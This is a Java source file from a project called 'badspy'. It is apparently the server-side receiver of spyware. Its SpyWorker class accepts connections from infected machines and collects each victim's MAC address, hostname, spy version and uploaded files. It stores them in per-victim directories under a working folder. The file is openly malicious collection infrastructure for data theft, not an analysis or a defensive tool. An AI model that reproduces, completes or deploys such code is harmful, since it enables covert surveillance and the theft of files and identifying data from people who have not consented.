package com.blogspot.sontx.badspy.badserver.bo.worker;

import com.blogspot.sontx.badspy.badserver.Config;
import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
import com.blogspot.sontx.badspy.badserver.bo.SpyDscFile;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jini.INIBadFormatException;
import com.blogspot.sontx.jlog.Log;

import java.io.Closeable;
import java.io.File;
import java.io.IOException;
import java.net.Socket;

/**
 * Copyright 2016 by sontx
 * Created by xuans on 20/4/2016.
 */
public class SpyWorker extends Thread implements Closeable {
    private Socket socket;
    private SpyReader reader;
    private SpyWriter writer;
    private File victimDir = null;
    private SpyDscFile dscFile = null;
    private OnCompletedListener mOnCompletedListener = null;

    public void setOnCompletedListener(OnCompletedListener listener) {
        mOnCompletedListener = listener;
    }

    public SpyWorker(Socket socket) throws IOException {
        this.socket = socket;
        this.reader = new SpyReader(socket.getInputStream());
        this.writer = new SpyWriter(socket.getOutputStream());
    }

    @Override
    public void run() {
        SpyDataHeader header = null;
        try {
            while ((header = reader.readHeader()) != null) {
                processHeader(header);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (mOnCompletedListener != null)
            mOnCompletedListener.onCompleted(this);
    }

    private void processHeader(SpyDataHeader header) throws IOException {
        switch (header.getContentType()) {
            case SpyDataHeader.HEADER_FILE:
                receiveFile(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_MAC:
                receiveMAC(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_HOSTNAME:
                receiveHostName(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_VERSION:
                receiveVersion(header.getContentLength());
                break;
        }
    }

    private void receiveVersion(int contentLength) throws IOException {
        if (victimDir == null) {
            Log.e("No victim directory exists!");
            return;
        }
        Log.i("Receiving spy version...");
        SpyVersionReceiver receiver = new SpyVersionReceiver(reader, writer, contentLength, victimDir);
        receiver.start();
        String spyVersion = receiver.getSpyVersion();
        if (spyVersion != null) {
            try {
                File verDir = new File(victimDir, spyVersion);
                if (!verDir.isDirectory())
                    verDir.mkdirs();
                dscFile = new SpyDscFile(new File(verDir, Config.DSC_FILENAME).getPath());
            } catch (INIBadFormatException e) {
                e.printStackTrace();
            }
        }
    }

    private void receiveHostName(int contentLength) throws IOException {
        if (dscFile == null) {
            Log.e("Not determine spy version");
            return;
        }
        Log.i("Receiving hostname...");
        SpyHostNameReceiver receiver = new SpyHostNameReceiver(reader,writer, contentLength, dscFile);
        receiver.start();
    }

    private void receiveMAC(int contentLength) throws IOException {
        Log.i("Receiving MAC address...");
        SpyMACReceiver receiver = new SpyMACReceiver(reader, writer, contentLength);
        receiver.start();
        if (receiver.getVictimDir() != null)
            this.victimDir = new File(Config.WORKING_DIR, receiver.getVictimDir());
    }

    private void receiveFile(int contentLength) throws IOException {
        if (dscFile == null) {
            Log.e("No victim directory exists!");
            return;
        }
        Log.i(String.format("Receiving file[%d bytes]...", contentLength));
        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, dscFile.getBaseFile().getParentFile());
        try {
            receiver.start();
            Log.i("Received file");
        } finally {
            receiver.close();
        }
    }

    @Override
    public void close() throws IOException {
        socket.close();
    }

    public interface OnCompletedListener {
        void onCompleted(SpyWorker worker);
    }
}
